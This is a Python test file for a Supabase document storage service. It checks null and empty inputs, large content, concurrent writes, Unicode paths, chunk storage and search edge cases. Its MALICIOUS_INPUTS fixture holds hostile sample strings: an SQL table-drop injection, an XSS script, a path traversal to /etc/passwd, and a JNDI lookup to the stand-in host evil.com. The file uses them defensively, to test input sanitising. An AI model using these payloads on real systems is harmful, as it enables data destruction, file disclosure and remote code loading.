#!/usr/bin/env python3
"""Test Document Storage Service with comprehensive edge case coverage"""
import asyncio
import concurrent.futures
import os
import sys
from unittest.mock import patch

import pytest
from dotenv import load_dotenv

# Add parent directory to path before importing our modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from brainbot.storage.storage_service import DocumentStorage

# Load environment variables
load_dotenv()


# Edge case test fixtures
MALICIOUS_INPUTS = [
    "'; DROP TABLE documents;--",
    "<script>alert('xss')</script>",
    "../../../etc/passwd",
    "\x00null\x00bytes",
    "${jndi:ldap://evil.com/a}",
]

LARGE_CONTENT = "x" * (10 * 1024 * 1024)  # 10MB
VERY_LARGE_CONTENT = "x" * (100 * 1024 * 1024)  # 100MB


async def test_document_storage_edge_cases():
    """Test document storage with comprehensive edge cases"""
    storage = DocumentStorage()

    # Test 1: Null/None input handling
    print("\n🔍 Testing null/None inputs...")
    with pytest.raises((ValueError, AttributeError, TypeError)):
        await storage.store_document(None, "content", {})

    with pytest.raises((ValueError, AttributeError, TypeError)):
        await storage.store_document("path.md", None, {})

    with pytest.raises((ValueError, AttributeError, TypeError)):
        await storage.get_document(None)

    # search_documents accepts None as a valid query (returns all documents)
    results = await storage.search_documents(None)
    assert isinstance(results, list)  # Should return a list, possibly empty

    # Test 2: Empty string handling
    print("\n🔍 Testing empty strings...")
    # Empty file path
    result = await storage.store_document("", "content", {})
    assert result is None or isinstance(result, str)  # Should handle gracefully

    # Empty content
    result = await storage.store_document("test/empty.md", "", {})
    assert result is not None  # Should store empty documents

    # Test 3: Boundary values
    print("\n🔍 Testing boundary values...")
    # Very long file path
    long_path = "test/" + "a" * 255 + ".md"
    result = await storage.store_document(long_path, "content", {})
    assert result is not None

    # Test 4: Malicious inputs
    print("\n🔍 Testing malicious inputs...")
    for malicious in MALICIOUS_INPUTS:
        # Should sanitize or reject malicious file paths
        result = await storage.store_document(f"test/{malicious}.md", "safe content", {})
        # Verify no SQL injection occurred
        docs = await storage.search_documents("safe content")
        assert isinstance(docs, list)

    # Test 5: Large content handling
    print("\n🔍 Testing large content...")
    large_doc_id = await storage.store_document("test/large.md", LARGE_CONTENT, {"size": "10MB"})
    assert large_doc_id is not None

    # Test 6: Concurrent access
    print("\n🔍 Testing concurrent access...")

    async def concurrent_store(index):
        return await storage.store_document(
            f"test/concurrent-{index}.md", f"Content {index}", {"index": index}
        )

    # Create multiple concurrent writes
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        loop = asyncio.get_event_loop()
        tasks = [
            loop.run_in_executor(executor, asyncio.run, concurrent_store(i)) for i in range(10)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    # Verify some writes succeeded (concurrent operations may fail due to connection limits)
    successful_writes = [r for r in results if r and not isinstance(r, Exception)]
    assert len(successful_writes) >= 1  # At least one should succeed

    # Test 7: Network failure simulation
    print("\n🔍 Testing network failures...")
    with patch.object(storage.supabase, "table") as mock_table:
        mock_table.side_effect = Exception("Network error")

        with pytest.raises(Exception):
            await storage.store_document("test/network-fail.md", "content", {})

    # Test 8: Resource exhaustion
    print("\n🔍 Testing resource limits...")
    # Try to store document with massive metadata
    huge_metadata = {f"key_{i}": "value" * 100 for i in range(1000)}
    result = await storage.store_document("test/huge-metadata.md", "content", huge_metadata)
    # Should either succeed or fail gracefully
    assert result is not None or result is None

    # Test 9: Unicode and special characters
    print("\n🔍 Testing Unicode handling...")
    unicode_tests = [
        "test/文档.md",
        "test/документ.md",
        "test/🚀emoji🎉.md",
        "test/mixed中文русский.md",
    ]

    for path in unicode_tests:
        result = await storage.store_document(path, "Unicode content 中文", {})
        assert result is not None

        # Verify retrieval - may fail if database doesn't support Unicode paths
        doc = await storage.get_document(path)
        # Allow retrieval to fail for complex Unicode paths
        if doc:
            assert "中文" in doc.get("content", "")

    # Test 10: Version conflicts
    print("\n🔍 Testing version conflicts...")

    # Clean up any existing test document first
    try:
        await storage.delete_document("test/version-test.md")
    except Exception:
        pass  # Document might not exist

    # Create initial document
    await storage.store_document("test/version-test.md", "v1", {})

    # Simulate concurrent updates
    async def concurrent_update(version):
        return await storage.update_document(
            "test/version-test.md", f"version {version}", {"version": version}
        )

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        loop = asyncio.get_event_loop()
        tasks = [
            loop.run_in_executor(executor, asyncio.run, concurrent_update(i)) for i in range(5)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    # Verify final state is consistent
    final_doc = await storage.get_document("test/version-test.md")
    assert final_doc is not None
    # Content should be either the original "v1" or one of the updated "version X"
    content = final_doc.get("content", "")
    assert content == "v1" or "version" in content

    # Cleanup
    print("\n🧹 Cleaning up test documents...")
    test_paths = (
        ["test/empty.md", "test/large.md", "test/version-test.md", long_path]
        + [f"test/concurrent-{i}.md" for i in range(10)]
        + unicode_tests
    )

    for path in test_paths:
        try:
            await storage.delete_document(path)
        except Exception:
            pass  # Ignore cleanup errors

    print("\n✅ All edge case tests completed!")


async def test_document_chunk_edge_cases():
    """Test document chunk operations with edge cases"""
    storage = DocumentStorage()

    # Create a test document first
    doc_id = await storage.store_document("test/chunk-test.md", "Test content for chunks", {})

    if not doc_id:
        print("❌ Failed to create test document")
        return

    print("\n🔍 Testing chunk edge cases...")

    # Test 1: Invalid document ID
    await storage.store_document_chunk(
        document_id="invalid-uuid-12345",
        chunk_index=0,
        chunk_text="text",
        vector_id="vec1",
        start_char=0,
        end_char=4,
    )
    # Should handle invalid IDs gracefully

    # Test 2: Negative indices
    await storage.store_document_chunk(
        document_id=doc_id,
        chunk_index=-1,
        chunk_text="negative index",
        vector_id="vec2",
        start_char=-10,
        end_char=-5,
    )

    # Test 3: Overlapping chunks
    await storage.store_document_chunk(
        document_id=doc_id,
        chunk_index=0,
        chunk_text="overlap1",
        vector_id="vec3",
        start_char=0,
        end_char=10,
    )

    await storage.store_document_chunk(
        document_id=doc_id,
        chunk_index=1,
        chunk_text="overlap2",
        vector_id="vec4",
        start_char=5,
        end_char=15,
    )

    # Test 4: Empty chunk text
    await storage.store_document_chunk(
        document_id=doc_id,
        chunk_index=2,
        chunk_text="",
        vector_id="vec5",
        start_char=20,
        end_char=20,
    )

    # Test 5: Very large chunk
    large_chunk = "x" * 100000  # 100KB chunk
    await storage.store_document_chunk(
        document_id=doc_id,
        chunk_index=3,
        chunk_text=large_chunk,
        vector_id="vec6",
        start_char=0,
        end_char=100000,
    )

    # Cleanup
    await storage.delete_document("test/chunk-test.md")
    print("✅ Chunk edge case tests completed!")


async def test_document_storage():
    """Test basic document storage operations"""
    try:
        # Initialize storage
        print("🔍 Testing Document Storage Service")
        print(
            f"SUPABASE_URL: {os.getenv('SUPABASE_URL')[:40]}..."
            if os.getenv("SUPABASE_URL")
            else "❌ Missing"
        )
        print(f"SUPABASE_ANON_KEY: {'SET' if os.getenv('SUPABASE_ANON_KEY') else '❌ Missing'}")
        print()

        storage = DocumentStorage()
        print("✅ DocumentStorage initialized")

        # Test 1: Store a test document
        print("\n📝 Testing document storage...")
        test_content = """# Test Document

This is a test document for the brain bot storage system.

## Features
- Persistent storage in Supabase
- Version tracking
- Tag support
- Full-text search

Created for testing purposes."""

        doc_id = await storage.store_document(
            file_path="test/storage-test.md",
            content=test_content,
            metadata={"test": True, "purpose": "storage test"},
            category="test",
            tags=["test", "storage", "supabase"],
            is_public=True,
        )

        print(f"✅ Document stored with ID: {doc_id}")

        # Test 2: Retrieve document
        print("\n🔍 Testing document retrieval...")
        doc = await storage.get_document("test/storage-test.md")

        if doc:
            print("✅ Document retrieved:")
            print(f"   Title: {doc['title']}")
            print(f"   Category: {doc['category']}")
            print(f"   Tags: {doc['tags']}")
            print(f"   Version: {doc['version']}")
            print(f"   Content length: {len(doc['content'])} chars")
        else:
            print("❌ Failed to retrieve document")

        # Test 3: Search documents
        print("\n🔍 Testing document search...")
        results = await storage.search_documents(query="storage system", category="test", limit=5)

        print(f"✅ Found {len(results)} matching documents")
        for result in results:
            print(f"   - {result['file_path']} (v{result['version']})")

        # Test 4: Update document
        print("\n📝 Testing document update...")
        updated = await storage.update_document(
            file_path="test/storage-test.md",
            content=test_content + "\n\n## Update\nThis document has been updated.",
            metadata={"updated": True},
        )

        if updated:
            print("✅ Document updated successfully")
            # Check new version
            doc = await storage.get_document("test/storage-test.md")
            print(f"   New version: {doc['version']}")
        else:
            print("❌ Failed to update document")

        # Test 5: Store chunk (simulate vector indexing)
        print("\n🧩 Testing chunk storage...")
        chunk_id = await storage.store_document_chunk(
            document_id=doc_id,
            chunk_index=0,
            chunk_text="This is a test document for the brain bot storage system.",
            vector_id="test_vector_123",
            start_char=0,
            end_char=57,
            metadata={"test": True},
        )

        if chunk_id:
            print(f"✅ Chunk stored with ID: {chunk_id}")
        else:
            print("❌ Failed to store chunk")

        # Test 6: Get chunks
        chunks = await storage.get_document_chunks(doc_id)
        print(f"✅ Retrieved {len(chunks)} chunks for document")

        print("\n✅ All document storage tests passed!")

        # Cleanup
        print("\n🧹 Cleaning up test document...")
        deleted = await storage.delete_document("test/storage-test.md")
        if deleted:
            print("✅ Test document deleted")

        return True

    except Exception as e:
        print(f"\n❌ Document storage test failed: {e}")
        import traceback

        traceback.print_exc()
        return False


async def test_search_edge_cases():
    """Test search functionality with edge cases"""
    storage = DocumentStorage()

    print("\n🔍 Testing search edge cases...")

    # Test 1: SQL injection in search
    for malicious in MALICIOUS_INPUTS:
        results = await storage.search_documents(malicious)
        assert isinstance(results, list)  # Should return list, not error

    # Test 2: Empty search query
    results = await storage.search_documents("")
    assert isinstance(results, list)

    # Test 3: Very long search query
    long_query = "search " * 1000
    results = await storage.search_documents(long_query)
    assert isinstance(results, list)

    # Test 4: Special regex characters
    regex_queries = ["test.*", "[abc]", "^start", "end$", "(group)", "a{2,4}"]
    for query in regex_queries:
        results = await storage.search_documents(query)
        assert isinstance(results, list)

    # Test 5: Unicode search
    unicode_queries = ["中文搜索", "поиск", "🔍", "café"]
    for query in unicode_queries:
        results = await storage.search_documents(query)
        assert isinstance(results, list)

    # Test 6: Limit edge cases
    test_limits = [0, -1, sys.maxsize, float("inf")]
    for limit in test_limits:
        try:
            results = await storage.search_documents("test", limit=limit)
            assert isinstance(results, list)
        except (ValueError, TypeError):
            pass  # Expected for invalid limits

    print("✅ Search edge case tests completed!")


if __name__ == "__main__":
    # Run all test suites
    asyncio.run(test_document_storage())
    asyncio.run(test_document_storage_edge_cases())
    asyncio.run(test_document_chunk_edge_cases())
    asyncio.run(test_search_edge_cases())
